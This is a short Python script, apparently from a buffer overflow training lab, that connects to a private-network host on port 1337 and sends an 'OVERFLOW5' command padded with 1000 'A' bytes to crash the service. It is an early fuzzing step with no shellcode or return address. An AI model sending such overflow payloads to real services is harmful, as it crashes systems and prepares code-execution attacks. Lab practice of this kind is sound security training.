import socket, struct

host, port = '10.10.60.7', 1337


command = b'OVERFLOW5 '

payload = b''.join([
command,
b'A'*1000,
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
